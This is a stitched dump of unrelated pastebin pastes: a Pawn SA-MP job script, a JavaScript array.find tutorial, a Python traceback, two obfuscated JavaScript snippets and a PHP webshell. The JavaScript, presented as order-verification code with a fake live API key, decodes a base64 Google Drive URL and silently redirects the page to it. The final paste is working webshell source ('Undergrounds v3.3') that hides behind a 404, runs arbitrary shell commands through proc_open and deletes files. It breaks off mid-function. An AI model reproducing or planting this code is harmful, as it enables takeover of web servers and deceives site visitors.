	PlayerTextDrawSetShadow( playerid, job_tde[ playerid ][ 0 ], 0 );
 
	job_tde[ playerid ][ 1 ] = CreatePlayerTextDraw( playerid, 188.162536, 385.416778, """" );
	PlayerTextDrawLetterSize( playerid, job_tde[ playerid ][ 1 ], 0.000000, 0.000000 );
	PlayerTextDrawTextSize( playerid, job_tde[ playerid ][ 1 ], 55.000000, 73.000000 );
	PlayerTextDrawAlignment( playerid, job_tde[ playerid ][ 1 ], 1 );
	PlayerTextDrawColor( playerid, job_tde[ playerid ][ 1 ], -1 );
	PlayerTextDrawSetShadow( playerid, job_tde[ playerid ][ 1 ], 0 );
	PlayerTextDrawSetOutline( playerid, job_tde[ playerid ][ 1 ], 0 );
	PlayerTextDrawBackgroundColor(playerid, job_tde[ playerid ][ 1 ], 0 );
	PlayerTextDrawFont( playerid, job_tde[ playerid ][ 1 ], 5 );
	PlayerTextDrawSetProportional( playerid, job_tde[ playerid ][ 1 ], 0 );
	PlayerTextDrawSetShadow( playerid, job_tde[ playerid ][ 1 ], 0 );
	PlayerTextDrawSetPreviewModel( playerid, job_tde[ playerid ][ 1 ], 367 );
	PlayerTextDrawSetPreviewRot( playerid, job_tde[ playerid ][ 1 ], 0.000000, 0.000000, 50.000000, 1.000000 );
 
	job_tde[ playerid ][ 2 ] = CreatePlayerTextDraw( playerid, 176.149337, 407.000030, ""85%"" );
	PlayerTextDrawLetterSize( playerid, job_tde[ playerid ][ 2 ], 0.152999, 0.649999 );
	PlayerTextDrawAlignment( playerid, job_tde[ playerid ][ 2 ], 2 );
	PlayerTextDrawColor( playerid, job_tde[ playerid ][ 2 ], -1 );
	PlayerTextDrawSetShadow( playerid, job_tde[ playerid ][ 2 ], 0 );
	PlayerTextDrawSetOutline( playerid, job_tde[ playerid ][ 2 ], 1 );
	PlayerTextDrawBackgroundColor( playerid, job_tde[ playerid ][ 2 ], 255 );
	PlayerTextDrawFont( playerid, job_tde[ playerid ][ 2 ], 1 );
	PlayerTextDrawSetProportional( playerid, job_tde[ playerid ][ 2 ], 1 );
	PlayerTextDrawSetShadow( playerid, job_tde[ playerid ][ 2 ], 0 );
	return ( 1 );
}
 
// ========================================================================== //
 
stock create_bar( playerid ) {
 
    job_bar[ playerid ] = CreatePlayerProgressBar( playerid, 156.000000, 419.000000, 40.000000, 1.700000, 191427839, 100.0000, 0 );
	return ( 1 );
}
 
// ========================================================================== //
 
stock create_pvar( playerid ) {
 
	fotograf[ playerid ] = 0;
	slika[ playerid ] = 0;
	usaovozilo[ playerid ] = -1;
	uzeoopremu[ playerid ] = 0;
	job_cp[ playerid ] = 0;
	edit[ playerid ] = 0;
 
}
 
//function
 
function load_job( job_id, name[], value[] ) {
 
    INI_Float( ""job_X"", Job_Info[ job_id ][ jX ] );
    INI_Float( ""job_Y"", Job_Info[ job_id ][ jY ] );
    INI_Float( ""job_Z"", Job_Info[ job_id ][ jZ ] );
    INI_Int( ""Job_Pickup"", Job_Info[ job_id ][ Job_Pickup ] );
    INI_Float( ""oprema_X"", Job_Info[ job_id ][ oX ] );
    INI_Float( ""oprema_Y"", Job_Info[ job_id ][ oY ] );
    INI_Float( ""oprema_Z"", Job_Info[ job_id ][ oZ ] );
    INI_Int( ""Oprema_Pickup"", Job_Info[ job_id ][ Oprema_Pickup ] );
    INI_Int( ""Kreiran"", Job_Info[ job_id ][ jKreiran ] );
    INI_Int( ""Pay"", Job_Info[ job_id ][ jPay ] );
    INI_Int( ""Bonus"", Job_Info[ job_id ][ jBonus ] );
    INI_Int( ""Skin"", Job_Info[ job_id ][ jSkin ] );
    return ( 1 );
}
 
// ========================================================================== //
 
function load_vehicle( v_id, name[], value[] ) {
 
    INI_Float( ""vehicle_X"", Vehicle_Info[ v_id ][ vehicle_X ] );
    INI_Float( ""vehicle_Y"", Vehicle_Info[ v_id ][ vehicle_Y]  );
    INI_Float( ""vehicle_Z"", Vehicle_Info[ v_id ][ vehicle_Z ] );
    INI_Float( ""vehicle_R"", Vehicle_Info[ v_id ][ vehicle_R ] );
    INI_Int( ""Vehicle_ID"", Vehicle_Info[ v_id ][ vehicle_id ] );
    INI_Int( ""v_ID"", Vehicle_Info[ v_id ][ veh_id ] );
    return ( 1 );
}
 
//dialogs
 
Dialog:equipment_dialog( playerid, response, listitem, inputtext[] ) {
 
	if( response ) {
 
	    new efile[ max_string ], job_id, Float:pos[ 3 ];
	    // ================================================================== //
	    if( strfind( inputtext, ""%"", true) != -1 ) return error( playerid, ""Koristite samo brojeve!"" ); {
 
			if( sscanf( inputtext, ""i"", job_id )) return h_dialogshow( playerid, equipment_dialog, DIALOG_STYLE_INPUT, job_style, ""Unesite ID job-a za kojeg zelite postaviti mjesto uzimanja opreme"", unesi, odustani );
			// ================================================================== //
			format( efile, sizeof( efile ), job_file, job_id );
			if( !fexist( efile )) return error( playerid, ""ID tog job-a ne postoji"" ); {
 
				// ================================================================== //
				GetPlayerPos( playerid, pos[0], pos[1], pos[2] );
				// ================================================================== //
				Job_Info[ job_id ][ oX ] = pos[ 0 ];
				Job_Info[ job_id ][ oY ] = pos[ 1 ];
				Job_Info[ job_id ][ oZ ] = pos[ 2 ];
				Job_Info[ job_id ][ Oprema_Pickup ] = 1275;
				edit[ playerid ] = 0;
				// ================================================================== //
				create_equipment( job_id );
				// ================================================================== //
				scm( playerid, col_2, ""* Uspjesno ste kreirali posao fotografa. Sada mozete koristiti dole navedene komande *"" );
				command( playerid, ""{ getjob }, { job }, { equipment }"" );
				// ================================================================== //
				Save_Job( job_id ); //saving job
			}
		}
	}
    return ( 1 );
}
 
// ========================================================================== //
 
Dialog:job_menu( playerid, response, listitem, inputtext[] ) {
 
		if( response ) {
			// ================================================================== //
			scm( playerid, col_2, ""* Uspjesno ste se zaposlili kao fotograf. Srecno u daljem radu * "" );
			command( playerid, ""{ job }, { equipment }"" );
			// ================================================================== //
			fotograf[ playerid ] = 1;
			// ================================================================== //
		}
    	return ( 1 );
}
 
// ========================================================================== //
 
Dialog:job_edit( playerid, response, listitem, inputtext[] ) {
 
	if( response ) {
 
	    new jFile[ max_string-78 ], andr8 = ( 1 );
	    format( jFile, sizeof( jFile ), job_file, andr8 );
	    switch( listitem ) {
 
    		case 0: {
 
  	    		new Float:pos[ 3 ];
				GetPlayerPos( playerid, pos[ 0 ], pos[ 1 ], pos[ 2 ] );
				Job_Info[ andr8 ][ jX ] = pos[ 0 ];
				Job_Info[ andr8 ][ jY ] = pos[ 1 ];
				Job_Info[ andr8 ][ jZ ] = pos[ 2 ];
				Delete3DTextLabel( job_label[ andr8 ] );
				DestroyDynamicPickup( job_pickup[ andr8 ] );
				Save_Job( andr8 ); create_job( andr8 );
				scm( playerid, col_2, ""* Uspjesno promjenjena pozicija posla *"" );
 
   			}
     		case 1: {
 
        		h_dialogshow( playerid, job_pickup, DIALOG_STYLE_INPUT, job_style, ""Unesite novi PickupID za postavljanje posla"", unesi, odustani );
      		}
       		case 2: {
 
                h_dialogshow( playerid, job_skin, DIALOG_STYLE_INPUT, job_style, ""Unesite novi SkinID za postavljanje posla"", unesi, odustani );
       		}
        	case 3: {
 
                h_dialogshow( playerid, job_pay, DIALOG_STYLE_INPUT, job_style, ""Unesite sumu novca za placu da postavite posao"", unesi, odustani );
           	}
           	case 4: {
 
                h_dialogshow( playerid, job_bonus, DIALOG_STYLE_INPUT, job_style, ""Unesite sumu novca za bonus da postavite posao"", unesi, odustani );
           	}
           	case 5: {
 
 				new Float:pos[ 3 ];
				GetPlayerPos( playerid, pos[ 0 ], pos[ 1 ], pos[ 2 ] );
				Job_Info[ andr8 ][ oX ] = pos[ 0 ];
				Job_Info[ andr8 ][ oY ] = pos[ 1 ];
				Job_Info[ andr8 ][ oZ ] = pos[ 2 ];
				Delete3DTextLabel( oprema_label[ andr8 ] );
				DestroyDynamicPickup( oprema_pickup[ andr8 ] );
				Save_Job( andr8 ); create_equipment( andr8 );
				scm( playerid, col_2, ""* Uspjesno ste promjenili poziciju za uzimanje opreme *"" );
			}
			case 6: {
 
			    h_dialogshow( playerid, oprema_pickup, DIALOG_STYLE_INPUT, job_style, ""Unesite ID pickupa kojeg zelite kreirati za uzimanje opreme"", unesi, odustani );
			}
			case 7: {
 
			     h_dialogshow( playerid, vehicle_park, DIALOG_STYLE_INPUT, job_style, ""Unesite ID vozila kojeg zelite parkirat"", unesi, odustani );
			}
		}
	}
    return ( 1 );
}
 
// ========================================================================== //
 
Dialog:job_pickup( playerid, response, listitem, inputtext[] ) {
 
	if( response ) {
	    new jFile[ max_string-28 ], j_pickup, ehr = ( 1 );
	    format( jFile, sizeof( jFile ), job_file,  ehr );
		if( sscanf( inputtext, ""i"", j_pickup )) return h_dialogshow( playerid, job_pickup, DIALOG_STYLE_INPUT, job_style, ""Unesite novi PickupID za postavljanje posla"", unesi, odustani ); {
			Job_Info[ ehr ][ Job_Pickup ] = j_pickup;
			new e_str[ max_string-48 ]; format( e_str, sizeof( e_str ), """"COL_3""* Uspjesno ste promjenuli Job_Pickup ID u ""COL_WHITE""Pickup_ID: %d ""COL_3""*"", j_pickup );
			scm( playerid, -1, e_str ); Save_Job( ehr ); create_job( ehr );
		}
	}
	return ( 1 );
}
 
Dialog:job_skin( playerid, response, listitem, inputtext[] ) {
 
	if( response ) {
 
	    new jFile[ max_string-28 ], job_skin, ehr = ( 1 );
	    format( jFile, sizeof( jFile ), job_file,  ehr );
		if( sscanf( inputtext, ""i"", job_skin )) return h_dialogshow( playerid, job_skin, DIALOG_STYLE_INPUT, job_style, ""Unesite novi SkinID za postavljanje posla"", unesi, odustani ); {
 
			Job_Info[ ehr ][ jSkin ] = job_skin;
			new e_str[ max_string-48 ]; format( e_str, sizeof( e_str ), """"COL_3""* Uspjesno ste promjenuli Skin_ID u ""COL_WHITE""Skin_ID: %d ""COL_3""*"", job_skin );
			scm( playerid, -1, e_str ); Save_Job( ehr ); 
		}
	}
	return ( 1 );
}
 
// ========================================================================== //
 
Dialog:job_pay( playerid, response, listitem, inputtext[] ) {
 
	if( response ) {
 
	    new jFile[ max_string-28 ], job_pay, ehr = ( 1 );
	    format( jFile, sizeof( jFile ), job_file,  ehr );
		if( sscanf( inputtext, ""i"", job_pay )) return h_dialogshow( playerid, job_pay, DIALOG_STYLE_INPUT, job_style, ""Unesite sumu novca za placu da postavite posao"", unesi, odustani ); {
 
			Job_Info[ ehr ][ jPay ] = job_pay;
			new e_str[ max_string-48 ]; format( e_str, sizeof( e_str ), """"COL_3""* Uspjesno ste promjenuli pocetnu platu posla ""COL_WHITE""Pay: %d$ ""COL_3""*"", job_pay );
			scm( playerid, -1, e_str ); Save_Job( ehr );
		}
	}
	return ( 1 );
}
 
// ========================================================================== //
 
Dialog:job_bonus( playerid, response, listitem, inputtext[] ) {
 
	if( response ) {
 
	    new jFile[ 80 ], job_bonus, ehr = ( 1 );
	    format( jFile, sizeof( jFile ), job_file,  ehr );
		if( sscanf( inputtext, ""i"", job_bonus )) return h_dialogshow( playerid, job_pay, DIALOG_STYLE_INPUT, job_style, ""Unesite sumu novca za placu da postavite posao"", unesi, odustani ); {
 
			Job_Info[ ehr ][ jBonus ] = job_bonus;
			new e_str[ 80 ]; format( e_str, sizeof( e_str ), """"COL_3""* Uspjesno ste promjenuli bonus posla ""COL_WHITE""Bonus: %d$ ""COL_3""*"", job_bonus );
			scm( playerid, -1, e_str ); Save_Job( ehr );
		}
	}
	return ( 1 );
}
 
// ========================================================================== //
 
Dialog:oprema_pickup( playerid, response, listitem, inputtext[] ) {
 
	if( response ) {
 
	    new jFile[ max_string-28 ], oprem_pickup, ehr = ( 1 );
	    format( jFile, sizeof( jFile ), job_file,  ehr );
		if( sscanf( inputtext, ""i"", oprem_pickup )) return h_dialogshow( playerid, oprema_pickup, DIALOG_STYLE_INPUT, job_style, ""Unesite Pickup_ID opreme za postavljanje posla"", unesi, odustani ); {
 
			Job_Info[ ehr ][ Oprema_Pickup ] = oprem_pickup;
			new e_str[ max_string-48 ]; format( e_str, sizeof( e_str ), """"COL_3""* Uspjesno ste promjenuli Oprema_Pickup ID u ""COL_WHITE""Pickup_ID: %d ""COL_3""*"", oprem_pickup );
			scm(playerid, -1, e_str); Save_Job( ehr ); create_equipment( ehr );
		}
	}
	return ( 1 );
}
 
// ========================================================================== //
 
Dialog:vehicle_park( playerid, response, listitem, inputtext[] ) {
 
	if( response ) {
 
		new i, Float:pos[ 4 ], vFile[ max_string-48 ];
		if( sscanf( inputtext, ""i"", i )) return h_dialogshow( playerid, vehicle_id, DIALOG_STYLE_INPUT, job_style, ""Unesite ID vozila za posao"", unesi, odustani ); {
 
			format( vFile, sizeof( vFile ), vehicle_file, i );
			if( !fexist( vFile )) return error( playerid, ""ID tog rent vozila ne postoji!"" );
			new v_id = GetPlayerVehicleID( playerid );
			GetVehicleZAngle( v_id, pos[ 3 ] );
			GetVehiclePos( v_id, pos[ 0 ], pos[ 1 ], pos[ 2 ] );
			Vehicle_Info[ i ][ vehicle_X ] = pos[ 0 ];
			Vehicle_Info[ i ][ vehicle_Y ] = pos[ 1 ];
			Vehicle_Info[ i ][ vehicle_Z ] = pos[ 2 ];
			Vehicle_Info[ i ][ vehicle_R ] = pos[ 3 ];
			DestroyVehicle( v_id );
			new e_str[ max_string-48 ]; format( e_str, sizeof( e_str ), """"COL_3""* Uspjesno ste parkirali ""COL_WHITE""Vehicle_ID: %d ""COL_3""*"", Vehicle_Info[ i ][ veh_id ] );
			scm( playerid, -1, e_str ); Save_Vehicle( i ); create_vehicle( i );
		}
	}
	return ( 1 );
}
 
// ========================================================================== //
 
/*comment:
 
	dodati provjere da se samo brojevi mogu pisati u dialog
 
*/"
pKkk2HKW,Dumps,LVL23HT,CSS,Sunday 20th of April 2025 11:13:33 AM CDT,"طحخكلهمب

"
i3deyvqy,Untitled,jm33,JavaScript,Sunday 20th of April 2025 11:04:51 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/23155/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
t10qvdev,007 includes method,xerocool-101,JavaScript,Sunday 20th of April 2025 11:00:51 AM CDT,"array.find((element, index, array) => {
  return condition;
});

// Array
const numbers = [5, 10, 15, 20];
const found = numbers.find(num => num > 10);
console.log(found); // 15 ✅ (first one > 10)

// Object
const users = [
  { id: 1, name: ""Alice"" },
  { id: 2, name: ""Bob"" },
  { id: 3, name: ""Charlie"" }
];

const user = users.find(u => u.id === 2);
console.log(user); // { id: 2, name: ""Bob"" }

// No Match
const result = [1, 2, 3].find(num => num > 5);
console.log(result); // undefined ❗️

// React
const UserProfile = ({ id, users }) => {
  const user = users.find(u => u.id === id);

  return user ? <h2>{user.name}</h2> : <p>User not found</p>;
};

// Find a product by ID in a shopping cart
const cart = [
  { id: 1, name: ""Shirt"", quantity: 2 },
  { id: 2, name: ""Shoes"", quantity: 1 }
];

const productId = 2;
const item = cart.find(product => product.id === productId);

console.log(item); 
// { id: 2, name: ""Shoes"", quantity: 1 }


// Find a user by username or ID
const users = [
  { id: 101, username: ""alice"" },
  { id: 102, username: ""bob"" }
];

const currentUser = users.find(u => u.username === ""bob"");

console.log(currentUser);
// { id: 102, username: ""bob"" }

// Find a blog post by slug or ID
const posts = [
  { id: 1, slug: ""intro-to-react"", title: ""React Basics"" },
  { id: 2, slug: ""advanced-hooks"", title: ""React Hooks"" }
];

const post = posts.find(p => p.slug === ""advanced-hooks"");

console.log(post.title); // ""React Hooks""

// Find an event happening on a specific date
const events = [
  { name: ""Hackathon"", date: ""2025-04-20"" },
  { name: ""Launch"", date: ""2025-05-01"" }
];

const today = ""2025-04-20"";
const eventToday = events.find(e => e.date === today);

console.log(eventToday?.name); // ""Hackathon""

// React Example
import React, { useState } from ""react"";

const App = () => {
  const [selectedId, setSelectedId] = useState(2); // Simulate selected user ID

  const users = [
    { id: 1, name: ""Alice"", age: 25, role: ""Admin"" },
    { id: 2, name: ""Bob"", age: 30, role: ""Editor"" },
    { id: 3, name: ""Charlie"", age: 22, role: ""Viewer"" },
  ];

  // 🔍 Find the user using `.find()`
  const user = users.find((u) => u.id === selectedId);

  return (
    <div style={{ padding: ""1rem"" }}>
      <h1>User Profile</h1>
      {user ? (
        <div>
          <p><strong>Name:</strong> {user.name}</p>
          <p><strong>Age:</strong> {user.age}</p>
          <p><strong>Role:</strong> {user.role}</p>
        </div>
      ) : (
        <p>User not found</p>
      )}
    </div>
  );
};

export default App;
"
4f8S86NB,AttributeError: 'NoneType' object has no attribute 'name',basedcount_bot,Python,Sunday 20th of April 2025 10:55:33 AM CDT,"Traceback (most recent call last):
  File ""/home/gmktec/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 46, in wrapper
    await func(reddit_instance, mongo_client)
  File ""/home/gmktec/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 275, in read_comments
    parent_info = await get_parent_info(comment)
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 237, in get_parent_info
    parent_author = parent_post.author.name
                    ^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: 'NoneType' object has no attribute 'name'
"
QUvwSEi7,Products.js,jm33,JavaScript,Sunday 20th of April 2025 10:49:22 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/12836/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
6S7pmPJv,Untitled,b3gund4L,PHP,Sunday 20th of April 2025 10:45:43 AM CDT,"<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
?>
<?php
?>
<!DOCTYPE html>
<html>
<head>
    <title>.::Undergrounds v3.3 Webshells::.</title>
    <meta charset=""utf-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1"">
    <meta name=""author"" content=""haxorqt"">
    <meta name=""viewport"" content=""Kontol"" />
    <meta name=""description"" content=""Error Page"">
    <meta property=""og:description"" content=""Error Page"">
    <meta property=""og:image"" content=""#"">
    <meta name=""robots"" content=""noindex"">
    <meta name=""googlebot"" content=""noindex"">
    <link rel=""stylesheet"" href=""https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"">
    <link href=""https://fonts.googleapis.com/css2?family=Carrois+Gothic&display=swap"" rel=""stylesheet"">
    <link href=""https://fonts.googleapis.com/css2?family=Bungee+Outline&display=swap"" rel=""stylesheet"">
    <link rel=""stylesheet"" href=""https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"">
    <link rel=""stylesheet"" href=""https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"">
</head>
<body>
    
<style>
    @import url(""https://fonts.googleapis.com/css?family=Dosis"");
    @import url(""https://fonts.googleapis.com/css?family=Carrois+Gothic"");
    @import url(""https://fonts.googleapis.com/css?family=Bungee+Outline"");
body {
    font-family: ""Dosis"", cursive;
    color: #fff;
    text-shadow:0px 0px 1px #757575;
    background-color: #212529;
    background-size: cover;
    background-attachment: fixed;
    background-repeat: no-repeat;
    background-size: 7%, 7%;
    background-position: right bottom, left bottom;
}

.directory-listing-table {
  margin: auto;
  background-color: #212529;
  padding: .7rem 1rem;
  max-width: 900px;
  width: 100%;
  box-shadow: 0 0 20px black;
  border: 1px solid #ffc107;
}
.header {
  margin: auto;
  background-color: #212529;
  padding: .7rem 1rem;
  max-width: 100%;
  width: 100%;
  box-shadow: 0 0 20px black;
  border-bottom: 1px solid #ffc107;
}
th {
    border-top: 1px solid #fff;
    border-bottom: 1px solid #fff;
}
tbody td {
  font-size: 13px;
  padding: 0.5rem;
  color: #fff;
  font-weight: 400;
  font-family: ""Roboto"", ""Poppins"", sans-serif;
}
tbody td a {
    text-decoration: none;
    color: #fff;
}
tbody td:not(:first-child) {
  text-align: center;
}

body::-webkit-scrollbar {
  width: 14px;
}

body::-webkit-scrollbar-track {
  background: #000;
}

body::-webkit-scrollbar-thumb {
  background-color: #212529;
  border: 3px solid #000;
}
input { 
    margin-bottom: 4px; 
    background: rgba(0,0,0,0.3);
    border: none;
    outline: none;
    padding: 5px;
    font-size: 15px;
    color: #fff;
    text-shadow: 1px 1px 1px rgba(0,0,0,0.3);
    border: 1px solid rgba(0,0,0,0.3);
    border-radius: 14px;
    box-shadow: inset 0 -5px 45px rgba(100,100,100,0.2), 0 1px 1px rgba(255,255,255,0.2);
    -webkit-transition: box-shadow .5s ease;
    -moz-transition: box-shadow .5s ease;
    -o-transition: box-shadow .5s ease;
    -ms-transition: box-shadow .5s ease;
    transition: box-shadow .5s ease;
}

textarea {
    max-width: 100%;
    max-height: 100%;
    padding-left: 2px;
    resize: none;
    overflow: auto;
    color: #fff;
    text-shadow: 1px 1px 1px rgba(0,0,0,0.3);
    border: 1px solid rgba(0,0,0,0.3);
    border-radius: 4px;
    box-shadow: inset 0 -5px 45px rgba(100,100,100,0.2), 0 1px 1px rgba(255,255,255,0.2);
    -webkit-transition: box-shadow .5s ease;
    -moz-transition: box-shadow .5s ease;
    -o-transition: box-shadow .5s ease;
    -ms-transition: box-shadow .5s ease;
    transition: box-shadow .5s ease;
    background: rgba(0,0,0,0.3);
}
.badge-action-edit:hover::after {
            content: ""Edit""
 }
        .badge-action-rename:hover::after {
            content: ""Rename""
        }
        .badge-action-chmod:hover::after {
            content: ""Chmod""
        }

        .badge-action-delete:hover::after {
            content: ""Delete""
        }

        .badge-action-download:hover::after {
            content: ""Download""
        }
        .badge-action-unzip:hover::after {
            content: ""UnZip""
        }
        .badge-action-tanggal:hover::after {
            content: ""ChDate""
        }
        .badge-action-unzip:hover::after,
        .badge-action-download:hover::after,
        .badge-action-delete:hover::after,
        .badge-action-chmod:hover::after,
        .badge-action-rename:hover::after,
        .badge-action-tanggal:hover::after,
        .badge-action-edit:hover::after {
            padding: 5px;
            border-radius: 10px;
            margin-left: -40px;
            color: #ffc107;
            border: 2px solid #ffc107;
            background-color: #212529;
        }
        .badge-action-unzip:hover::after,
        .badge-action-download:hover::after,
        .badge-action-delete:hover::after,
        .badge-action-chmod:hover::after,
        .badge-action-rename:hover::after,
        .badge-action-tanggal:hover::after,
        .badge-action-edit:hover::after {
            width: 68px;
            text-align: center;
            margin-top: -53px;
            display: block;
            position: absolute;
            font-size: 14px;
        }

textarea::-webkit-scrollbar {
  width: 12px;
}

textarea::-webkit-scrollbar-track {
  background: #000000;
}

textarea::-webkit-scrollbar-thumb {
  background-color: #212529;
  border: 3px solid black;
}

a {
    color: #fff;
    text-decoration: none;
}

a:hover {
    color: #999797;
    text-shadow:0px 0px 2 0px #ED360E;
}

input,select,textarea {
    border: 1px #000000 solid;
    -moz-border-radius: 5px;
    -webkit-border-radius:5px;
    border-radius:5px;
}

select:after {
    cursor: pointer;
}
.pencet {
    background-color: rgb(0 0 0 / 57%);
    color: #fff;
    border-color: blanchedalmond;
}
.crot {
      border-radius: 50%;
      padding: 15px;
      width: 100px;
      height: 100px;
}
.haxorqt-text {
    font-size: 19pt;
    font-family: ""Carrois Gothic"", cursive;
    color: #fff;
    text-align: center;
    background: linear-gradient(200deg, #000000 25%, #ffffff 50%, #ffffff 75%, #ffffff 100%);
    background-size: 200% auto;
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    animation: animate 1.2s linear infinite; 
    }
@keyframes animate{ to { background-position: 200% center;
      }
    }
body, a, button:link{cursor:url(https://raw.githubusercontent.com/GanestSeven/script/refs/heads/main/cursorpnis-removebg-preview.png), 
    default;
} 
    button:hover {
    cursor:url(https://raw.githubusercontent.com/GanestSeven/script/refs/heads/main/cursorpnis-removebg-preview.png),
    wait;
}
    a:hover {
    cursor:url(https://raw.githubusercontent.com/GanestSeven/script/refs/heads/main/cursorpnis-removebg-preview.png),
    wait;
}
</style>
</td>
<script>
function myFunction() {
  var copyText = document.getElementById(""myInput"");
  copyText.select();
  copyText.setSelectionRange(0, 99999); // For mobile devices
  navigator.clipboard.writeText(copyText.value);
  alert(""Copied Successfully!!"");
}
</script>
<?php
error_reporting(0);
set_time_limit(0);
@clearstatcache();
@ini_set('error_log', null);
@http_response_code(404);
$web = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? ""https"" : ""http"") . ""://"".$_SERVER['HTTP_HOST'];
$disfunc = @ini_get(""disable_functions"");
if (empty($disfunc)) {
    $disf = ""<font color='lime'>AMAN</font>"";
} else {
    $disf = ""<font color='red'>"".$disfunc.""</font>"";
}
function author() {
    echo ""</div><table class='directory-listing-table'><td><center><font face='Carrois Gothic' size='3px'>2017 &copy; haxorqt | Haxorqt team</center></td></table><br>"";
    exit();
}

function cekdir() {
    if (isset($_GET['path'])) {
        $serlok = $_GET['path'];
    } else {
        $serlok = getcwd();
    }
    if (is_writable($serlok)) {
        return ""<font color='lime'>Aman Coy</font>"";
    } else {
        return ""<font color='red'>KONTOL!</font>"";
    }
}

function cekroot() {
    if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
        return ""<font color='lime'>Aman Coy</font>"";
    } else {
        return ""<font color='red'>KONTOL!</font>"";
    }
}
function haxorqt_ex($file) {
    $pile = $file;
    $pch = pathinfo($pile, PATHINFO_FILENAME);
    return $pch;
}

function xrmdir($dir) {
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $path = $dir.'/'.$item;
        if (is_dir($path)) {
            xrmdir($path);
        } else {
            unlink($path);
        }
    }
    rmdir($dir);
}
function net($hexnet) {
            for ($i = 0; $i < strlen($hexnet); $i++) {
                $haxorqt .= dechex(ord($hexnet[$i]));
            }
            return $haxorqt;
        }
function owner($file) {
    if (function_exists(""posix_getpwuid"")) {
        $tod = @posix_getpwuid(fileowner($file));
        return ""<center>"".$tod['name'].""</center>"";
    } else {
        return ""<center>"".fileowner($file).""</center>"";
    }
}

function cekwrite($serlok) {
    $izin = substr(sprintf('%o', fileperms($serlok)), -4);
    if (is_writable($serlok)) {
        return ""<font color=lime>"".$izin.""</font>"";
    } else {
        return ""<font color=red>"".$izin.""</font>"";
    }
}
function cmd($gas, $serlok) {
    $crot = $gas;
    $pr = ""proc_open"";
    if (function_exists($pr)) {
    $tod = @proc_open($crot, array(0 => array(""pipe"", ""r""), 1 => array(""pipe"", ""w""), 2 => array(""pipe"", ""r"")), $crottz, $serlok);
    echo """".stream_get_contents($crottz[1]).""</textarea></center><br>"";
    } else {
        echo ""<font color='orange'></font>"";
    }
}
function ekse($coman, $serlok) {
    $ler = ""2>&1"";
    if (!preg_match(""/"".$ler.""/i"", $coman)) {
        $coman = $coman."" "".$ler;
    }
    $komen = $coman;
    $pr = ""proc_open"";
    if (function_exists($pr)) {
    $tod = @$pr($komen, array(0 => array(""pipe"", ""r""), 1 => array(""pipe"", ""w""), 2 => array(""pipe"", ""r"")), $crottz, $serlok);
    echo ""<pre><textarea rows='25' style='color:lime;' readonly='' cols='120px'>
    "".htmlspecialchars(stream_get_contents($crottz[1])).""</textarea></pre><br>"";
    } else {
        echo ""<font color='orange'>proc_open function is disabled!!</font>"";
    }
}
function ipserv() {
    if (empty($_SERVER['SERVER_ADDR'])) {
        return gethostbyname($_SERVER['SERVER_NAME']);
        if (empty(gethostbyname($_SERVER['SERVER_NAME']))) {
            return $_SERVER['SERVER_NAME'];
        }
    } else {
        return $_SERVER['SERVER_ADDR'];
    }
}

function cekfile($file) {
     return '<i class=""fa fa-file-code-o"" style=""font-size:17px;color:#456DEB;""></i>';
}
function filedate($file) {
    return date(""F d Y g:i:s"", filemtime($file));
}
function fext($file) {
    $sub = ""\163\x75"" . ""\142\x73"" . ""\x74\x72"";
    return $sub(strrchr($file,'.'),1);
} function gazz($file) {
